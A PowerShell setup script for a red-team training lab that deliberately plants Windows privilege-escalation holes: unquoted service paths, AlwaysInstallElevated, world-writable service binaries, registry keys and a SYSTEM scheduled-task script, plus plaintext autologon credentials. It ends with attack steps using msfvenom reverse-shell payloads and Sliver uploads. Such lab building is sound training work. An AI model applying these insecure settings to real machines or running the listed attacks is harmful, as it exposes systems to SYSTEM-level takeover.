# ============================================================
# ORSUBANK AD RED TEAM LAB - LOCAL PRIVILEGE ESCALATION
# ============================================================
# Script Name: Enable-LocalPrivEscVulnerabilities.ps1
# Purpose: Creates local privilege escalation paths on workstations
# Location: Run on WS01 and WS02
# 
# WHAT THIS SCRIPT DOES:
# 1. Unquoted Service Paths - Exploit spaces in service paths
# 2. AlwaysInstallElevated - Install MSI as SYSTEM
# 3. Weak Service Permissions - Modify service binaries
# 4. Weak Registry Permissions - Hijack services via registry
# 5. Stored Credentials - Credentials in common locations
# ============================================================

# Verify running as Administrator
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "[!] ERROR: Run this script as Administrator!" -ForegroundColor Red
    exit 1
}

Write-Host @"

╔══════════════════════════════════════════════════════════════════════════════╗
║      ORSUBANK - LOCAL PRIVILEGE ESCALATION VULNERABILITIES                   ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  Creating local privesc paths on this workstation                             ║
║  Machine: $($env:COMPUTERNAME)                                                           ║
╚══════════════════════════════════════════════════════════════════════════════╝

"@ -ForegroundColor Cyan

# ============================================================
# VULN 1: UNQUOTED SERVICE PATH
# ============================================================

Write-Host "[*] Creating VULN 1: Unquoted Service Path" -ForegroundColor Yellow
Write-Host "    Creating 'ORSU Update Service' with unquoted path containing spaces" -ForegroundColor Gray

# Create the directory structure
$VulnPath = "C:\Program Files\ORSU Bank\Update Service"
New-Item -Path $VulnPath -ItemType Directory -Force | Out-Null

# Create a dummy executable
$DummyExe = @"
using System;
class Program { static void Main() { Console.WriteLine("ORSU Update Service Running"); System.Threading.Thread.Sleep(-1); } }
"@
Add-Type -TypeDefinition $DummyExe -OutputAssembly "$VulnPath\UpdateSvc.exe" -OutputType ConsoleApplication -ErrorAction SilentlyContinue

# If compilation fails, just create a copy of notepad
if (-not (Test-Path "$VulnPath\UpdateSvc.exe")) {
    Copy-Item "C:\Windows\System32\notepad.exe" "$VulnPath\UpdateSvc.exe"
}

# Create service with UNQUOTED path (the vulnerability!)
$ServicePath = "C:\Program Files\ORSU Bank\Update Service\UpdateSvc.exe"  # Note: NOT quoted!
sc.exe create "ORSUUpdateService" binPath= $ServicePath start= auto | Out-Null
sc.exe description "ORSUUpdateService" "ORSUBANK Automatic Update Service" | Out-Null

Write-Host "    [+] Created 'ORSUUpdateService' with unquoted path" -ForegroundColor Green
Write-Host "    [!] Path: C:\Program Files\ORSU Bank\Update Service\UpdateSvc.exe" -ForegroundColor Magenta
Write-Host "    [!] Drop malicious 'ORSU.exe' in C:\Program Files\ to hijack!" -ForegroundColor Magenta

# ============================================================
# VULN 2: ALWAYSINSTALLELEVATED
# ============================================================

Write-Host "`n[*] Creating VULN 2: AlwaysInstallElevated" -ForegroundColor Yellow
Write-Host "    Enabling MSI installation as SYSTEM for all users" -ForegroundColor Gray

# Set both HKLM and HKCU registry keys
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Force | Out-Null
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -Value 1 -Type DWord

New-Item -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -Value 1 -Type DWord

Write-Host "    [+] AlwaysInstallElevated enabled in HKLM and HKCU" -ForegroundColor Green
Write-Host "    [!] Any user can now install MSI packages as SYSTEM!" -ForegroundColor Magenta

# ============================================================
# VULN 3: WEAK SERVICE BINARY PERMISSIONS
# ============================================================

Write-Host "`n[*] Creating VULN 3: Weak Service Permissions" -ForegroundColor Yellow

# Create a service with world-writable binary
$WeakServicePath = "C:\Services\VulnService"
New-Item -Path $WeakServicePath -ItemType Directory -Force | Out-Null

# Copy notepad as our "service"
Copy-Item "C:\Windows\System32\notepad.exe" "$WeakServicePath\vulnservice.exe"

# Make the directory writable by everyone
$Acl = Get-Acl $WeakServicePath
$Rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
$Acl.AddAccessRule($Rule)
Set-Acl $WeakServicePath $Acl

# Also make the exe writable
$Acl = Get-Acl "$WeakServicePath\vulnservice.exe"
$Acl.AddAccessRule($Rule)
Set-Acl "$WeakServicePath\vulnservice.exe" $Acl

# Create the service
sc.exe create "VulnService" binPath= "$WeakServicePath\vulnservice.exe" start= auto | Out-Null
sc.exe description "VulnService" "Vulnerable test service with weak permissions" | Out-Null

Write-Host "    [+] Created 'VulnService' with world-writable binary" -ForegroundColor Green
Write-Host "    [!] Binary: C:\Services\VulnService\vulnservice.exe" -ForegroundColor Magenta
Write-Host "    [!] Replace with malicious exe, restart service = SYSTEM shell!" -ForegroundColor Magenta

# ============================================================
# VULN 4: WEAK REGISTRY PERMISSIONS
# ============================================================

Write-Host "`n[*] Creating VULN 4: Weak Registry Permissions" -ForegroundColor Yellow

# Create a service for registry hijacking
Copy-Item "C:\Windows\System32\notepad.exe" "C:\Windows\Temp\regsvc.exe"
sc.exe create "RegHijackService" binPath= "C:\Windows\Temp\regsvc.exe" start= auto | Out-Null

# Make the service's registry key writable by everyone
$RegPath = "HKLM:\SYSTEM\CurrentControlSet\Services\RegHijackService"
$Acl = Get-Acl $RegPath
$Rule = New-Object System.Security.AccessControl.RegistryAccessRule("Everyone", "FullControl", "Allow")
$Acl.AddAccessRule($Rule)
Set-Acl $RegPath $Acl

Write-Host "    [+] Created 'RegHijackService' with weak registry permissions" -ForegroundColor Green
Write-Host "    [!] Modify ImagePath in HKLM:\SYSTEM\CurrentControlSet\Services\RegHijackService" -ForegroundColor Magenta

# ============================================================
# VULN 5: STORED CREDENTIALS IN REGISTRY (RunAs)
# ============================================================

Write-Host "`n[*] Creating VULN 5: Stored AutoLogon Credentials" -ForegroundColor Yellow

# Store fake autologon credentials
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "DefaultUserName" -Value "svc_autologon"
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "DefaultPassword" -Value "AutoLogon@2024!"
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "DefaultDomainName" -Value "ORSUBANK"
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "AutoAdminLogon" -Value "0"  # Don't actually autologon

Write-Host "    [+] Stored autologon credentials in registry" -ForegroundColor Green
Write-Host "    [!] User: svc_autologon | Pass: AutoLogon@2024!" -ForegroundColor Magenta

# ============================================================
# VULN 6: SCHEDULED TASK WITH WEAK PERMISSIONS
# ============================================================

Write-Host "`n[*] Creating VULN 6: Vulnerable Scheduled Task" -ForegroundColor Yellow

# Create a script that runs as SYSTEM
$TaskScript = "C:\ScheduledTasks\cleanup.ps1"
New-Item -Path "C:\ScheduledTasks" -ItemType Directory -Force | Out-Null
"Write-Host 'Cleanup running...'" | Out-File $TaskScript

# Make script writable by everyone
$Acl = Get-Acl $TaskScript
$Rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Allow")
$Acl.AddAccessRule($Rule)
Set-Acl $TaskScript $Acl

# Create scheduled task running as SYSTEM
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File $TaskScript"
$Trigger = New-ScheduledTaskTrigger -Daily -At "3:00AM"
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName "ORSUCleanup" -Action $Action -Trigger $Trigger -Principal $Principal -Force | Out-Null

Write-Host "    [+] Created 'ORSUCleanup' task running as SYSTEM" -ForegroundColor Green
Write-Host "    [!] Script C:\ScheduledTasks\cleanup.ps1 is world-writable!" -ForegroundColor Magenta
Write-Host "    [!] Modify script content = runs as SYSTEM at 3 AM!" -ForegroundColor Magenta

# ============================================================
# VERIFICATION
# ============================================================

Write-Host "`n" + "=" * 70 -ForegroundColor DarkGray
Write-Host "VERIFICATION" -ForegroundColor Cyan
Write-Host "=" * 70 -ForegroundColor DarkGray

Write-Host "`n[*] Checking Unquoted Service Paths:" -ForegroundColor Yellow
Get-CimInstance Win32_Service | Where-Object {$_.PathName -notlike '"*' -and $_.PathName -like '* *'} | ForEach-Object {
    Write-Host "    [+] $($_.Name): $($_.PathName)" -ForegroundColor Green
}

Write-Host "`n[*] Checking AlwaysInstallElevated:" -ForegroundColor Yellow
$HKLM = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue).AlwaysInstallElevated
$HKCU = (Get-ItemProperty "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue).AlwaysInstallElevated
if ($HKLM -eq 1 -and $HKCU -eq 1) {
    Write-Host "    [+] AlwaysInstallElevated: ENABLED (HKLM=$HKLM, HKCU=$HKCU)" -ForegroundColor Green
}

Write-Host "`n[*] Checking Stored Credentials:" -ForegroundColor Yellow
$StoredUser = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "DefaultUserName" -ErrorAction SilentlyContinue).DefaultUserName
$StoredPass = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "DefaultPassword" -ErrorAction SilentlyContinue).DefaultPassword
if ($StoredUser -and $StoredPass) {
    Write-Host "    [+] AutoLogon: $StoredUser / $StoredPass" -ForegroundColor Green
}

# ============================================================
# ATTACK INSTRUCTIONS
# ============================================================

Write-Host @"

╔══════════════════════════════════════════════════════════════════════════════╗
║                     LOCAL PRIVILEGE ESCALATION ATTACKS                        ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║  ATTACK 1: UNQUOTED SERVICE PATH                                             ║
║  ─────────────────────────────────                                           ║
║  Path: C:\Program Files\ORSU Bank\Update Service\UpdateSvc.exe              ║
║  Windows searches: C:\Program.exe, then C:\Program Files\ORSU.exe            ║
║                                                                              ║
║  [Kali] > msfvenom -p windows/x64/shell_reverse_tcp ... -f exe > ORSU.exe   ║
║  [Sliver] > upload ORSU.exe "C:\Program Files\ORSU.exe"                      ║
║  [Sliver] > shell -> sc stop ORSUUpdateService; sc start ORSUUpdateService  ║
║                                                                              ║
║  ATTACK 2: ALWAYSINSTALLELEVATED                                             ║
║  ─────────────────────────────────                                           ║
║  [Kali] > msfvenom -p windows/x64/shell_reverse_tcp ... -f msi > evil.msi   ║
║  [Sliver] > upload evil.msi C:\Users\Public\evil.msi                         ║
║  [Sliver] > shell -> msiexec /quiet /qn /i C:\Users\Public\evil.msi         ║
║  Result: MSI installs as SYSTEM = SYSTEM shell!                              ║
║                                                                              ║
║  ATTACK 3: WEAK SERVICE BINARY                                               ║
║  ─────────────────────────────────                                           ║
║  [Sliver] > upload evil.exe C:\Services\VulnService\vulnservice.exe          ║
║  [Sliver] > shell -> sc stop VulnService; sc start VulnService              ║
║                                                                              ║
║  ATTACK 4: SCHEDULED TASK HIJACK                                             ║
║  ─────────────────────────────────                                           ║
║  Modify C:\ScheduledTasks\cleanup.ps1 to run reverse shell                  ║
║  Wait for 3 AM or: schtasks /run /tn ORSUCleanup                            ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝

"@ -ForegroundColor White

Write-Host "[+] Local privilege escalation vulnerabilities configured!" -ForegroundColor Green
